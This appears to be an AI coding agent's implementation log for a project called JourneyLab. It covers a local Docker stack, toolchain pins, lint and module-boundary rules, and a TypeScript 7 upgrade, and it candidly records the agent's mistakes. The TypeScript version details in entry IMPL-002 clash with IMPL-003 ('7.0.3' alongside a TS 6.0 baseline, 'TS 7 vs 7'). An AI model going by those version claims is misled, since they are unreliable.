`docker-compose.dev.yml` bringing up PostgreSQL 18.4 (PostGIS 3.6.4 + pgvector 0.8.6 + pg_trgm 1.6), Redis 8, MinIO, NATS JetStream and Jaeger v2 — all on the reserved port block **5700-5709**, bound to `127.0.0.1` only. Plus `infra/local/postgres/Dockerfile`, init SQL, `.env.example`, a port-collision guard, and `pnpm dev` / `dev:down` / `dev:reset` / `dev:logs`.

### Why this approach
**Port isolation was an explicit repository-owner constraint** — multiple projects share this Docker host. Rather than picking ports ad hoc, JourneyLab reserves a contiguous documented block and a guard enforces it.

The important subtlety: **a stopped project still owns its ports.** Port 5544 read as free to `lsof` purely because Saakshya was stopped. The guard therefore parses other projects' compose *files*, not just live sockets. Checking only what is running would have produced a collision the first time that project restarted.

### Decisions taken during implementation
| Decision | Alternatives | Rationale |
| --- | --- | --- |
| Multi-stage PostGIS + copied pgvector | Downgrade to PG17; drop pgvector locally; build from source | **Preserves the full baseline.** PG17 has no arm64 PostGIS either; dropping an extension would make local diverge from production; no compiler exists in the base image |
| amd64 emulation for PostgreSQL | Native PG17 | Measured ~3s to ready — cheaper than breaching the PG18 baseline |
| NATS as local queue | Kafka, Redpanda | `DEC-009` is open; the AsyncAPI contract is transport-independent, so this is deliberately substitutable |
| Bind all ports to `127.0.0.1` | Default `0.0.0.0` | Nothing on a dev machine should be network-reachable by default |
| Pinned MinIO `RELEASE.*` tag | `latest` | `REQ-PLAT-002` forbids floating tags |

### What surprised us — five wrong assumptions, all caught by execution
1. **`postgis/postgis:18-3.6` is amd64-only.** `docker manifest inspect` said EXISTS, so it looked fine until the build failed with "no match for platform". Existence and runnability are different questions on Apple Silicon.
2. **PGDG has no PostGIS or pgvector package for PG18** on either image's repo — the postgis image carries only 4 packages and no compiler, ruling out both apt and source builds.
3. **PostgreSQL 18 changed its volume mount point.** Mounting `/var/lib/postgresql/data` makes the container refuse to start; PG18 wants `/var/lib/postgresql` so `pg_upgrade --link` does not cross a mount boundary.
4. **`jaegertracing/all-in-one:1.62` does not exist.** I invented a plausible tag; the correct image is `jaegertracing/jaeger:2.0.0`.
5. **I twice wrote a wrong comment about the Jaeger image** — first "distroless, no shell" (it has a shell), then "no wget or nc" (it has both). Corrected to a working healthcheck rather than documenting a limitation that was not real. Writing a confident explanation for a failure is easy; verifying it is the work.

### Process slip — recorded rather than hidden
The heredoc that should have written this entry, the regression entry and the sub-step status **failed with a Python syntax error, and the commit proceeded anyway**. `8a9af9b` therefore shipped without its required documentation, violating [SUB_STEP_PROTOCOL](../02-delivery/SUB_STEP_PROTOCOL.md) §8.

Cause: the commit ran in the same shell invocation as the log-writing script, so a failure in the first half did not stop the second. **Correction:** documentation writes must succeed before `git commit` runs, not alongside it. Logged as `BUG-003`.

### Verification
| Check | Result |
| --- | --- |
| 5/5 services healthy | PASS |
| Extensions functional (157 km geodesic; L2 √27) | PASS |
| Host connectivity on 5700-5707 | PASS |
| No collision with trekyatra / saakshya / real-estate | PASS |
| Port guard meta-test | PASS |
| `pnpm verify` (12 checks) | PASS |

---

## IMPL-003 — STEP-001.03 — Ownership, governance and the TypeScript 7 upgrade

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-003 |
| Decisions | `ADR-009` (TypeScript 7.0.2), `ADR-010` (ownership) |
| Blast radius | BR-003 (LOW after mitigation) |
| Graph indexed commit | `ef7af7a` — matched HEAD at pre-change |
| Commit | `1a44d71` |

> **Written retrospectively during the STEP-001 closure audit.** The audit found this
> entry missing: `STEP-001.03` was committed with `BR-003` and a regression entry, but
> no implementation-log entry. Recorded as `BUG-005` — including why the
> `substep-docs` guard failed to catch it.

### What was built
`CODEOWNERS` (catch-all + 9 rules), `SECURITY.md`, `CONTRIBUTING.md`; ownership propagated across 56 documents and every step's front-matter; TypeScript upgraded 6.0.3 → 7.0.2; `dependency-cruiser` removed and the boundary check rewritten TypeScript-independently.

### Why this approach
Two owner decisions arrived together. `ADR-010` closed `BLK-001`, the highest-exposure realised risk in the register — until then no step could leave `READY` and no gate could be signed off.

`ADR-009` was the `ASM-004` revalidation case: the blueprint baseline said TypeScript 6.0, but 7.0.2 was `latest`, and portfolio standard §4.18 requires current stable at implementation time. I pinned 6.0.3 first and surfaced 7 for explicit owner choice rather than adopting it silently.

### What surprised us
**TypeScript 7 silently broke module-boundary enforcement.** `dependency-cruiser` 18.1.1 supports `typescript <7`; under the new pin it cruised **0 modules and reported "no dependency violations found"** — a green check verifying nothing. `ADR-003`'s splittability guarantee would have become unenforced without anyone noticing.

Caught only because the boundary guard's meta-test asserts the **rule name**, not merely a non-zero exit. The fix was to rewrite the check TypeScript-independently: import paths are textual, so no compiler upgrade can disable the rule again.

**My pre-change analysis missed this.** I checked the *source* dependency surface (0 files) and called the risk minimal, without checking which *tools* consume TypeScript. Lesson recorded in `BR-003`: for version upgrades, enumerate consuming tools, not just importing source.

### Consequence recorded, not hidden
A single owner **cannot satisfy four-eyes approval** (`REQ-ADMIN-002`, `SC-GOV-02`). That control is now structurally unsatisfiable and must be resolved before `STEP-021` — either a second reviewer or an explicit accepted-risk decision.

### Verification
| Check | Result |
| --- | --- |
| `CODEOWNERS` coverage — all paths owned | PASS |
| TS 7 config valid; `noUncheckedIndexedAccess` still enforced | PASS (exit 0 / exit 1 respectively) |
| Boundary rule fires after rewrite | PASS |
| R5 gap closed — 178 paths owned | PASS |
| `pnpm verify` | PASS |

---

## IMPL-002 — STEP-001.02 — Formatting, linting, strict TypeScript and module boundaries

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001 (and enables ADR-003 enforcement) |
| Blast radius | BR-002 (LOW) |
| Graph indexed commit | `11e47a6` — **found stale at `2fe8318`, refreshed per protocol step 3 before proceeding** |
| Commit | *(this commit)* |

### What was built
`.editorconfig`, `biome.json` (Biome 2.5.7), `tsconfig.base.json` (TypeScript 7.0.3, strict + `noUncheckedIndexedAccess` + `exactOptionalPropertyTypes`), `.dependency-cruiser.cjs` module boundary rules, four guards in `tests/guards/`, and a full `pnpm verify` chain covering both JS and Python.

### Why this approach
**Module boundaries are enforced from before the first source file exists.** `ADR-003` chose a modular monolith on the promise it can be split later; that promise is only real if cross-module reach-ins fail the build. Adding the rule after packages exist means retrofitting against violations already written.

The five boundary rules encode architecture decisions directly:
- `no-cross-module-internals` — packages expose entry points, not internals
- `services-not-imported-by-web` — the web app talks to services over generated clients only
- `no-generated-edits` — protects `REQ-PLAT-007`
- `no-circular` — circular imports are the leading indicator of boundary erosion
- `no-orphans` (warn) — surfaces dead modules

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |
| **TypeScript 7.0.3, not 7.0.2** | Adopt latest | Blueprint baseline is TS 6.0. Honoring a documented decision is not a new decision; deviating would be. **TS 7 surfaced to the owner for explicit `ASM-004` revalidation rather than silently adopted** | Not yet — pending owner |
| Biome over ESLint+Prettier | ESLint ecosystem | Baseline is silent on linter; Biome is one tool for lint+format, and nothing depends on it yet so it is cheaply replaceable | No |
| dependency-cruiser for boundaries | Biome/ESLint import rules | Only tool that expresses cross-package path rules with the needed precision | No |
| Vacuous-pass guards for empty tree | Omit the scripts until code exists | `tsc` and `mypy` error on an empty tree — a false failure. Guards make the empty case **explicit and self-documenting** rather than silently skipped, and convert to real checks the moment source lands | No |

### Deviations from the step file
Sub-step listed "per-package `tsconfig.json` extending the base" — **deferred**, because zero packages exist. It moves to STEP-002 where the first package is created. Recorded rather than silently dropped.

### What surprised us
1. **The pre-change analysis earned its keep.** It found `BUG-002` (`node_modules` tracked) before any code was written — a defect no existing test covered.
2. **The graph was stale on entry** (`2fe8318` vs `11e47a6`). Protocol step 3 says refresh before continuing; had I skipped it, the analysis would have been against the wrong tree.
3. **Biome rejected its own config twice** — a deprecated `recommended` field and formatting that did not match its own formatter. Fixed via `biome migrate --write` and self-format. A linter that lints its own configuration is a genuinely good property.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |
| TypeScript 7 vs 7 baseline decision | **Open — owner** | `ASM-004` revalidation |
| Per-package `tsconfig.json` | Deferred | STEP-002 |
| Real lint/typecheck targets | Deferred | STEP-002 |
| `node_modules` artifact guard | Regression test | BUG-002 |

### Verification
| Check | Result |
| --- | --- |
| `pnpm verify` (10-command chain) | **PASS** |
| Boundary rule meta-test | **PASS** — rule `no-cross-module-internals` fired on seeded violation |
| Artifact guard meta-test | **PASS** — exit 1 on seeded `dist/seeded.js` |
| `ruff check` / `ruff format --check` | PASS — 12 files formatted |
| `detect_changes()` | 0 changed symbols, 4 changed files, risk low |

---

## IMPL-001 — STEP-001.01 — Workspace skeleton and pinned toolchain

| Field | Value |
| --- | --- |
| Date | 2026-08-05 |
| Requirements | REQ-PLAT-001, REQ-PLAT-002 |
| Blast radius | BR-001 (LOW) |
| Graph indexed commit | `c37d106` — matched HEAD at pre-change |

### What was built
pnpm workspace (`package.json`, `pnpm-workspace.yaml`) and uv Python workspace
(`pyproject.toml`), version pins (`.nvmrc` 24, `.python-version` 3.14), workspace
directories (`apps/`, `packages/`, `services/`, `tests/`) with boundary READMEs,
and both lock files generated.

### Why this approach
Two toolchain decisions were escalated to the repository owner under `ADR-007`
(propose, then confirm), because the environment did not match the documented plan:

| Decision | Environment finding | Owner choice |
| --- | --- | --- |
| Package manager | pnpm absent, corepack unavailable | **Install pnpm globally** (over npm workspaces) |
| Node runtime | local v25.9.0 vs. Node 24 LTS baseline | **Install Node 24 locally** (over adopting 25) |

Both preserve the blueprint baseline rather than bending it to the machine, which
keeps `ASM-004` honest.

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |
| Ruff `DTZ` rule enabled | Default rule set | Flags naive datetimes. This product has three time axes; a naive datetime becomes an infeasible itinerary in STEP-012 | No — captured in `pyproject.toml` comment |
| Placeholder scripts exit 0 with a `[STEP-001.02]` marker | Omit scripts entirely | `pnpm verify` is runnable from day one; markers make the gap visible rather than silent | No |
| pytest markers for `security`/`contract`/`property` | Add later | R7 and R2 need selectable suites from the first test | No |

### Deviations from the step file
None in scope. The step file assumed pnpm and Node 24 were present; both had to be
installed first. Recorded as environment facts, not scope change.

### What surprised us
Two things, both instructive:

1. **`pnpm install` was the first thing in this repository that actually executed
   anything** — and it immediately found `BUG-001`, a defect present in 110 files
   for hours. Markdown had silently absorbed it.
2. **The regression guard reproduced the bug inside itself.** Embedding the literal
   offending pattern truncated the guard's own source file. Fixed by assembling the
   pattern at runtime; the failure mode is now documented in the guard's header so
   nobody "simplifies" it back.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |
| Stray-markup guard | Regression test | `tests/guards/no-stray-markup.sh` |
| Lock-file drift CI enforcement | Deferred | STEP-001.03 |
| Node 24 PATH is not persistent (keg-only brew install) | Documentation | STEP-001.05 README |

### Verification
| Check | Result |
| --- | --- |
| `pnpm install` under Node 24.19.0 | PASS — `pnpm-lock.yaml` created |
| `uv sync` | PASS — Python 3.14.2 resolved, `uv.lock` created |
| `pnpm verify` | PASS |
| Regression R1–R7 | See REGRESSION_LOG |

---

## What must be logged

| Event | Log here | Also log |
| --- | --- | --- |
| Sub-step implemented | ✅ | Regression log, tracker |
| Bug found during implementation | Reference it | [BUG_REGISTER](BUG_REGISTER.md) |
| Bug fixed | Reference it | [BUG_REGISTER](BUG_REGISTER.md) + regression test |
| Enhancement beyond requirement | Reference it | [ENHANCEMENT_LOG](ENHANCEMENT_LOG.md) |
| Architectural decision taken mid-work | ✅ + promote | [DECISION_LOG](../02-delivery/DECISION_LOG.md) as an ADR |
| Assumption invalidated | ✅ | [ASSUMPTION_REGISTER](../02-delivery/ASSUMPTION_REGISTER.md) |
| Approach abandoned | ✅ **with the reason** | Sub-step marked `DROPPED` |
| Dependency or version change | ✅ | Blast-radius record |

**Negative results are recorded, not discarded** (portfolio standard §7.38). An approach that failed and why is more valuable to the next engineer than a clean history that hides it.
